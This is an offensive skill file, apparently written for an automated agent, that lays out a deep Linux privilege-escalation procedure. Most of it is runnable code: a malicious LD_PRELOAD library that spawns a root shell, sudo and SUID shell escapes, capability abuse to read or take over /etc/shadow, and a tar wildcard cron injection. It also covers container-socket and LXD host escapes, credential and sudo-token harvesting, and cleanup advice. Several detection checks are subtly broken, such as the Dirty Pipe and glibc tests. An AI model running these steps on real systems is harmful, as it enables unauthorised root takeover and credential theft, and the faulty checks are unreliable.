---
name: privesc-linux-deep
description: Advanced Linux privilege escalation — kernel exploit selection, SUID/GUID deep analysis, capabilities abuse, container escape paths, cron hijacking, polkit/vulnerability scanning, and eBPF exploitation
version: 1.0.0
phase: post
category: privilege_escalation
tags: [privesc, linux, kernel, escalation, suid]
tools: [linpeas, pspy, python3, gcc]
difficulty: advanced
opsec_level: high
time_estimate: 300s
severity_if_found: critical
related_skills:
  - privesc-linux
  - container-escape-deep
  - linux-security-bypass
mitre_attack:
  - T1068
  - T1548.001
  - T1548.003
  - T1546.004
  - T1547.006
  - T1053.003
  - T1611
---

## When to Use

Use this skill when basic Linux privesc enumeration (sudo, SUID list, cron)
found nothing exploitable. This covers deep techniques: kernel CVE selection
matching the exact kernel version, capabilities beyond the common list,
container/namespace escapes, polkit/dbus attack surfaces, and eBPF abuse.

## Prerequisites

- Shell access (low-privilege) on Linux target
- Python 3, gcc (or cc), curl/wget on target
- Kernel version known (`uname -a`)
- List of installed packages (`dpkg -l` or `rpm -qa`)
- pspy64 for cron/process timing analysis
- linpeas.sh for initial scan (optional, but recommended)

## Procedure

```bash
# ──────────────────────────────────────────────
# 1. DEEP SYSTEM RECONNAISSANCE
# ──────────────────────────────────────────────

# Kernel and architecture
uname -a
cat /proc/version
cat /etc/os-release || cat /etc/*release 2>/dev/null

# Mounted filesystems and special mounts
mount | grep -E "noexec|nosuid|nodev"
cat /proc/mounts | grep -v "^proc\|^tmpfs\|^devpts\|^sysfs\|^cgroup\|^devtmpfs"
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS | grep -v "tmpfs\|proc\|sysfs\|cgroup\|devpts\|devtmpfs"

# All users and groups
cat /etc/passwd | grep -v nologin | grep -v /bin/false
cat /etc/group
for user in $(cat /etc/passwd | cut -d: -f1); do
    groups $user 2>/dev/null
done

# Capabilities for ALL files (not just known bins)
getcap -r / 2>/dev/null

# Check for extended attributes that may affect execution
find / -type f -exec getfattr -d {} \; 2>/dev/null | head -100

# Running services as root
ps aux | grep ^root | grep -v "\["
systemctl list-units --type=service --all 2>/dev/null

# ──────────────────────────────────────────────
# 2. KERNEL EXPLOIT — CVE SELECTION
# ──────────────────────────────────────────────

# Build an exploitability matrix from kernel version
# Store and match against known-good CVEs

KERNEL=$(uname -r)
echo "[*] Kernel: $KERNEL"

# Check common exploitable kernel versions
# Dirty Pipe (CVE-2022-0847) — kernels 5.8 - 5.16.11, 5.15.25, 5.10.102
echo $KERNEL | grep -qE "5\.(8|9|1[0-6])\." && \
  echo "[CVE-2022-0847] Dirty Pipe — within vulnerable range (5.8 - 5.16.11)"

# PwnKit (CVE-2021-4034) — pkexec, almost all distros before 2022
which pkexec 2>/dev/null && pkexec --version 2>/dev/null
ls -la $(which pkexec) 2>/dev/null
# If pkexec exists and is SUID (rws), PwnKit likely works
test -u $(which pkexec) 2>/dev/null && echo "[CVE-2021-4034] pkexec SUID — PwnKit candidate"

# CVE-2022-0847 check (Dirty Pipe)
# Requires CONFIG_BINFMT_ELF or CONFIG_BINFMT_SCRIPT (almost always present)
uname -r | grep -qE "^5\." && echo "[+] Checking Dirty Pipe..."
# Test if /proc/self/mem write works:
echo -n "test" | dd of=/proc/self/mem bs=1 seek=0 count=4 2>/dev/null && \
  echo "[CVE-2022-0847] /proc/self/mem writable — possible"

# CVE-2023-2640 / CVE-2023-32629 (Ubuntu GameOverlay)
# Affects Ubuntu kernels with overlayfs + nosuid
grep -q "overlay" /proc/filesystems && modinfo -p overlay 2>/dev/null | grep -q "userxattr" && \
  echo "[CVE-2023-2640] overlayfs + userxattr — GameOverlay candidate"

# CVE-2023-35001 (BPF signed integer overflow)
cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null
[ $? -eq 0 ] && echo "[CVE-2023-35001] unprivileged_bpf_disabled = $?" \
  " — BPF exploitation candidate"

# ──────────────────────────────────────────────
# 3. SUID/GUID DEEP ANALYSIS
# ──────────────────────────────────────────────

# Comprehensive SUID find
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null > /tmp/suid_files.txt
# GUID (sgid)
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null > /tmp/sgid_files.txt

# Custom SUID analysis — check for uncommon/dangerous binaries
while read -r line; do
    bin=$(echo "$line" | awk '{print $NF}')

    # Check if it's a known dangerous binary
    case "$(basename $bin)" in
        find|nmap|vim|vi|less|more|nano|emacs|awk|sed|python*|perl|ruby|lua|php*|node*)
            echo "[EXPLOIT] Known dangerous SUID: $bin (can spawn shell)"
            ;;
        env|gettext|passwd|mount|cpt|chsh|chfn|gpasswd|newgrp|pkexec)
            # Standard SUID — note but not exploitable directly
            ;;
        *)
            # Unknown binary — require deeper analysis
            file "$bin" 2>/dev/null | grep -q "ELF" && {
                echo "[CUSTOM] Unknown SUID ELF: $bin — needs manual review"
                strings "$bin" 2>/dev/null | grep -iE "exec|system|popen|shell|root" | head -5
                # Check if it honors environment variables
                # Run with strace to see what it does:
                # ltrace -e getenv+execve $bin 2>&1 | head -20
            }
            ;;
    esac
done < /tmp/suid_files.txt

# Check for SUID on custom scripts (NOT just binaries)
find / -perm -4000 -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" \) 2>/dev/null

# ──────────────────────────────────────────────
# 4. LD_PRELOAD ABUSE ON SUDO
# ──────────────────────────────────────────────

# Check if sudo allows env_keep+=LD_PRELOAD
sudo -l 2>/dev/null | grep -i "env_keep\|LD_PRELOAD"

# If LD_PRELOAD is preserved, create a malicious library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
# Execute via sudo:
sudo LD_PRELOAD=/tmp/preload.so <any-allowed-command>

# Alternative: sudo shells via allowed commands
sudo -l 2>/dev/null | while read -r line; do
    cmd=$(echo "$line" | grep -oP '\(.*\) \K/.*' | awk '{print $1}')
    case "$(basename $cmd)" in
        vim|vi|nano|less|more|man|cp|mv|cat|tee)
            echo "[SUDO] Shell via $cmd: sudo $cmd + :!/bin/sh"
            ;;
        python*|perl|ruby|lua|php*)
            echo "[SUDO] Shell via $cmd: sudo $cmd -c 'import os; os.system(\"/bin/sh\")'"
            ;;
        find)
            echo "[SUDO] Shell via find: sudo find . -exec /bin/sh \; -quit"
            ;;
        awk|sed)
            echo "[SUDO] Shell via $cmd: sudo $cmd 'BEGIN {system(\"/bin/sh\")}'"
            ;;
    esac
done

# ──────────────────────────────────────────────
# 5. CAPABILITIES EXPLOITATION
# ──────────────────────────────────────────────

# CAP_SYS_ADMIN — mount namespace, access to namespaces
getcap -r / 2>/dev/null | grep cap_sys_admin
# If a binary has CAP_SYS_ADMIN + CAP_DAC_OVERRIDE, it can do anything

# CAP_DAC_OVERRIDE — bypass file permission checks
getcap -r / 2>/dev/null | grep cap_dac_override
# Exploit: read any file
# If python has CAP_DAC_OVERRIDE:
# python -c "print(open('/etc/shadow').read())"

# CAP_NET_RAW — raw sockets (packet injection, ARP spoofing)
getcap -r / 2>/dev/null | grep cap_net_raw
# Exploit: ping sweep, SYN flood
# Required for tcpdump without root

# CAP_NET_ADMIN — network configuration, firewall manipulation
getcap -r / 2>/dev/null | grep cap_net_admin
# Exploit: change iptables, modify routing

# CAP_SYS_PTRACE — ptrace any process
getcap -r / 2>/dev/null | grep cap_sys_ptrace
# Exploit: inject shellcode into a root-owned process
# python exploit (if python has the capability):
# ptrace attach to PID 1, inject shellcode into memory

# CAP_CHOWN — change ownership of any file
getcap -r / 2>/dev/null | grep cap_chown
# Exploit: chown /etc/shadow to current user

# CAP_FOWNER — bypass ownership checks
getcap -r / 2>/dev/null | grep cap_fowner
# Exploit: chmod 777 /etc/shadow, then read it

# CAP_SETUID / CAP_SETGID — arbitrary UID/GID setting
getcap -r / 2>/dev/null | grep cap_setuid
# Exploit: setuid(0) then exec /bin/sh

# CAP_SYS_RAWIO — raw I/O, memory access
getcap -r / 2>/dev/null | grep cap_sys_rawio
# Exploit: read/write physical memory via /dev/mem

# Automated: test each capability for exploitation
python3 -c "
import subprocess, os

# Test if python itself has capabilities
test_cap = lambda cap: os.system(f'getcap /proc/$$/exe | grep -qi {cap}') == 0

exploits = {
    'cap_dac_override': \"print(open('/etc/shadow').read())\",
    'cap_sys_admin': \"os.system('mount -t proc none /proc && ps aux')\",
    'cap_setuid': \"os.setuid(0); os.system('/bin/bash -p')\",
    'cap_chown': \"os.chown('/etc/shadow', os.geteuid(), os.getegid())\",
}

for cap, exploit in exploits.items():
    if test_cap(cap):
        print(f'[CAP] {cap} — exploitable via current process')
"
# Note: capabilities are per-executable, not per-session
# Check capabilities on the specific binary being used

# ──────────────────────────────────────────────
# 6. DOCKER SOCKET / CONTAINER ESCAPE
# ──────────────────────────────────────────────

# Check if we're in a container
cat /proc/1/cgroup | grep -qi docker && echo "[CONT] Inside Docker container"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i container

# Docker socket check
ls -la /var/run/docker.sock 2>/dev/null
# If accessible, can control host Docker:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# Run a privileged container with host mount:
# docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash

# Containerd (ctr) socket
ls -la /run/containerd/containerd.sock 2>/dev/null
# If accessible:
ctr --address /run/containerd/containerd.sock images list
ctr --address /run/containerd/containerd.sock run --rm \
  -t --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/ubuntu:latest /bin/sh

# LXD group abuse
id | grep -q lxd && echo "[LXD] User in lxd group — container escape possible"
# Exploit:
# 1. Build LXD Alpine image locally:
#   lxc image import alpine.tar.gz alpine-rootfs.tar.gz --alias alpine
# 2. Start container with host rootfs mount:
#   lxc init alpine privesc -c security.privileged=true
#   lxc config device add privesc host-root disk source=/ path=/mnt/root
#   lxc start privesc
#   lxc exec privesc /bin/sh
# Then chroot to /mnt/root and access host filesystem

# ──────────────────────────────────────────────
# 7. CRON / PATH HIJACKING
# ──────────────────────────────────────────────

# Watch for cron jobs with pspy (run in background)
# Upload pspy64 and run:
chmod +x pspy64
./pspy64 -i 1000 -t 2>/dev/null &
PSPY_PID=$!
sleep 30
kill $PSPY_PID 2>/dev/null

# Check all writable script paths in cron
# Look for scripts that run as root with writable paths
for cron_script in /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/*; do
    [ -w "$cron_script" ] && echo "[CRON] WRITABLE: $cron_script"
done

# Wildcard injection in tar/rsync cron jobs
# Look for cron scripts containing tar cf * or rsync * patterns
grep -r "tar.*\*\|tar.*\\.\\*\|rsync.*\*" /etc/cron* /var/spool/cron/* 2>/dev/null

# If a root cron script uses tar with wildcards:
# cd /tmp
# echo '#!/bin/bash' > exploit.sh
# echo "chmod u+s /bin/bash" >> exploit.sh
# chmod +x exploit.sh
# echo "" > --checkpoint=1
# echo "" > "--checkpoint-action=exec=sh exploit.sh"
# # When tar runs, it will execute exploit.sh as root

# Python library hijacking via PYTHONPATH
# If a root cron job runs a Python script:
# Check for writable paths in the script's import chain
# Find scripts running as root with writable locations:
for script in /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/*; do
    if file "$script" | grep -q "Python script"; then
        echo "[CRON-PYTHON] $script"
        grep -E "^(import|from)" "$script" 2>/dev/null | head -10
        # Check if any import can be hijacked in writable PYTHONPATH
    fi
done

# ──────────────────────────────────────────────
# 8. NFS ROOT SQUASHING
# ──────────────────────────────────────────────

# Check exports
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# If no_root_squash is enabled on an export we can mount:
# mount -t nfs localhost:/exported /mnt
# Then create a SUID binary on the mounted share
# chown root:root /mnt/suid_bin
# chmod u+s /mnt/suid_bin

# Check what we can mount from localhost:
rpcinfo -p 2>/dev/null | grep nfs

# ──────────────────────────────────────────────
# 9. SNAP CREATE-USER (Ubuntu)
# ──────────────────────────────────────────────

# On Ubuntu systems with snap installed, the classic vulnerability:
# snap create-user creates a sudo-capable user if the snap daemon runs as root

# Check if snap is installed:
which snap 2>/dev/null && echo "[SNAP] installed"
snap --version 2>/dev/null

# If snap is present and we have the sudo group:
# snap create-user --sudoer <existing-username> 2>/dev/null
# This can grant passwordless sudo

# ──────────────────────────────────────────────
# 10. DBUS SERVICE EXPLOITATION
# ──────────────────────────────────────────────

# Enumerate dbus services accessible to our session
dbus-send --session --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListActivatableNames 2>/dev/null

# Check for dbus services running as root with weak policy
# System dbus (requires specific policy scanning):
busctl list 2>/dev/null
busctl introspect <service> <object_path> 2>/dev/null

# Look for method calls that allow command execution
# Common targets: org.freedesktop.systemd1, org.freedesktop.PolicyKit1,
# org.freedesktop.Accounts, com.ubuntu.SystemService

# If org.freedesktop.Accounts is accessible:
# dbus-send --system --dest=org.freedesktop.Accounts \
#   --type=method_call --print-reply \
#   /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
#   string:"hacker" string:"Full Name" int32:0

# ──────────────────────────────────────────────
# 11. POLKIT VULNERABILITY SCANNING
# ──────────────────────────────────────────────

# Check if polkit is installed and version
pkaction --version 2>/dev/null
which pkexec

# CVE-2021-4034 (PwnKit) — pkexec
# Exploitable on almost all distros before June 2022
if [ -u "$(which pkexec 2>/dev/null)" ]; then
    echo "[CVE-2021-4034] PwnKit — pkexec SUID present"
    # Check if patched:
    # dpkg -l policykit-1 | grep -E "0\.105-[0-9]+ubuntu"

    # Exploit:
    # Upload CVE-2021-4034 exploit (e.g., from https://github.com/ly4k/PwnKit)
    # Or use the one-liner:
    # pkexec --help 2>&1 | head -1  # (not vulnerable; need actual exploit binary)
fi

# CVE-2022-0847 (Dirty Pipe) — versions 5.8 - 5.16.11, 5.15.25, 5.10.102
echo $KERNEL | grep -qE "5\.(8|9|1[0-6])\." && \
  echo "[CVE-2022-0847] Dirty Pipe — fetch exploit for $KERNEL"

# CVE-2023-32629 / CVE-2023-2640 (Ubuntu GameOverlay overlayfs)
cat /proc/filesystems | grep -q overlay && \
  grep -q "overlay" /proc/filesystems && modprobe overlay 2>/dev/null && \
  echo "[CVE-2023-32629] overlayfs present — GameOverlay candidate"

# CVE-2023-0386 (overlayfs + FUSE)
cat /proc/filesystems | grep -q fuseblk && \
  echo "[CVE-2023-0386] FUSE available — overlayfs privilege escalation candidate"

# CVE-2023-4911 (Looney Tunables — glibc ld.so)
/lib/x86_64-linux-gnu/libc.so.6 2>/dev/null | grep "GNU C Library" | grep -qE "2\.3[5-8]" && \
  echo "[CVE-2023-4911] Looney Tunables — glibc 2.35-2.38, check GLIBC_PRIVATE exploit"

# ──────────────────────────────────────────────
# 12. eBPF EXPLOITATION
# ──────────────────────────────────────────────

# Check if eBPF is available and unprivileged access is allowed
cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null
# 0 = unprivileged BPF allowed, 1 = root only, 2 = locked (reboot required to change)

# Check if bpf syscall is accessible:
python3 -c "
import ctypes, os
# Attempt bpf syscall (BPF_PROG_LOAD for a simple socket filter)
# Kernels without CONFIG_BPF_SYSCALL will return ENOENT
try:
    r = os.system('python3 -c \"import ctypes; ctypes.CDLL(None).syscall(321, 5, None, 0)\" 2>/dev/null')
    if r == 0:
        print('[eBPF] bpf syscall accessible')
except:
    print('[eBPF] bpf syscall not available')
"

# If unprivileged eBPF is allowed (< 0), and kernel is < 5.15:
# Can use eBPF-based exploits for kernel memory read/write
# Known CVEs:
# - CVE-2022-23222: eBPF verifier issue (Linux < 5.16.2)
# - CVE-2023-2166: eBPF verifier flaw (Linux < 6.2)
# - CVE-2023-36054: eBPF kernel information leak

# Check BPF programs already loaded:
# ls /sys/fs/bpf/ 2>/dev/null
# bpftool prog list 2>/dev/null

# ──────────────────────────────────────────────
# 13. ADVANCED CREDENTIAL HARVESTING FOR PRIVESC
# ──────────────────────────────────────────────

# Extract credentials from process memory
# Check for processes running as root that contain credentials
# ssh-agent:
SSH_AUTH_SOCK=$(find /tmp -type s -name "agent.*" 2>/dev/null | head -1)
if [ -n "$SSH_AUTH_SOCK" ]; then
    echo "[CRED] SSH agent socket found: $SSH_AUTH_SOCK"
    # Can be used to authenticate as the key owner
fi

# Check for .bash_history with passwords:
find / -name ".bash_history" -exec grep -l "passwd\|password\|ssh\|su " {} \; 2>/dev/null

# Check for configuration files with embedded credentials:
for pattern in "password" "passwd" "secret" "token" "api_key"; do
    find /etc /opt /home -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \
      -o -name "*.yml" -o -name "*.yaml" -o -name "*.json" \) \
      -exec grep -il "$pattern" {} \; 2>/dev/null | head -20
done

# Check sudo tokens (if another user used sudo recently)
find /proc -name "sudo" -type f 2>/dev/null
# or check /run/sudo/ts/
ls -la /run/sudo/ts/ 2>/dev/null
# Steal sudo timestamp:
# If we can read other user's sudo timestamp, we can reuse it
# (requires same PID namespace — works outside containers)

# ──────────────────────────────────────────────
# 14. CUSTOM SUID BINARY EXPLOITATION
# ──────────────────────────────────────────────

# For custom SUID binaries, understand what they do:
find / -perm -4000 -type f 2>/dev/null | while read -r suid_bin; do
    # Skip standard binaries
    case "$(basename $suid_bin)" in
        mount|umount|su|sudo|pkexec|passwd|chsh|chfn|gpasswd|newgrp|pam_timestamp_check)
            continue ;;
    esac

    echo "=== Analyzing custom SUID: $suid_bin ==="
    # Check dynamic dependencies
    ldd "$suid_bin" 2>/dev/null
    # Check if it calls system/popen/exec
    strings "$suid_bin" 2>/dev/null | grep -iE "system|popen|execv|execve|fork|PATH|HOME|IFS"
    # Check if it reads environment variables
    strings "$suid_bin" 2>/dev/null | grep -iE "^[A-Z_]+$" | grep -v "^\." | head -10
    # Check if it reads config files
    strace -e openat,open "$suid_bin" 2>&1 | grep -i "config\|conf\|rc\|\.ini" | head -5
done
```

## OPSEC Rules

- **CRITICAL**: Kernel exploits can crash the system — have a fallback plan
- Do NOT run kernel exploits on production systems without explicit authorization
- Prefer user-land privilege escalation (SUID, capabilities, sudo) over kernel exploits
- PSPY runs as a process visible in `ps aux` — clean up after use
- Compile exploits on a matching kernel to avoid compilation errors on target
- Clean up all exploit artifacts (source files, binaries, temp dirs)
- When testing container escape techniques, verify you're actually in a container first
- Some kernel exploits (Dirty Pipe) modify read-only files — these are permanent changes
- Do NOT install packages — use static binaries or existing tools
- Document the exact exploit path for the report; do not leave standing access

## Verification

- Verify escalation succeeded: `id` should show `uid=0(root)`
- Verify the escalation is repeatable (not a one-shot race condition)
- Test that the technique works on reboot (kernel patches may be applied)
- Verify the exploit does not leave user-land artifacts (check /tmp, /dev/shm)
- If using container escape, verify host root access (read /etc/shadow on host)
- If using capabilities, verify they persist after exec (some are bounding set filtered)
- Test polkit exploit with a non-root shell, not from an already privileged context

## Pitfalls

- Kernel exploits have high crash risk — always have a backup plan
- Dirty Pipe modifies files permanently — use on non-production targets
- PwnKit is patched on almost all updated distros since June 2022
- Container escapes depend on runtime (Docker vs containerd vs podman)
- LXD group exploitation requires the lxd binary on target (not always installed)
- eBPF exploitation needs kernel compiled with `CONFIG_BPF_SYSCALL=y` and no `bpf_disabled`
- Polkit version detection is unreliable — test the exploit directly
- NFS root squashing: `no_root_squash` is rare in modern environments
- Snap create-user requires sudo group membership AND the snap daemon
- Capabilities are set on specific executables — check the binary you'll run, not just any file
- Cron wildcard injection depends on the exact tar/rsync version
- LD_PRELOAD with sudo only works if env_reset is disabled (Default !env_reset in sudoers)

## Output Format

```
[KERNEL]  5.15.0-86-generic — Ubuntu 22.04 LTS (x86_64)
[CVE]     CVE-2022-0847 (Dirty Pipe) — kernel in range 5.8-5.16.11, exploitable
[SUID]    12 custom SUID binaries found
[CAPS]    /usr/bin/python3.10 has cap_dac_override+ep — read any file
[CRON]    /etc/cron.daily/backup.sh uses tar with wildcard — injectable
[CONT]    Docker container detected — /var/run/docker.sock NOT accessible
[LXD]     User in lxd group — LXD escape possible (requires image build)
[NFS]     /export (no_root_squash) — create SUID binary remotely
[DBUS]    org.freedesktop.Accounts accessible — CreateUser method available
[POLKIT]  CVE-2021-4034 (PwnKit) — pkexec SUID, unpatched
[eBPF]    unprivileged_bpf_disabled=0 — CVE-2022-23222 candidate
[PSPY]    Found 3 root cron jobs running scripts: backup.sh, cleanup, sync.sh
[SUDO]    LD_PRELOAD preserved via env_keep — preload.so will escalate
[CRITICAL] Root shell obtained via CVE-2022-0847 (Dirty Pipe) — /etc/passwd modified
```

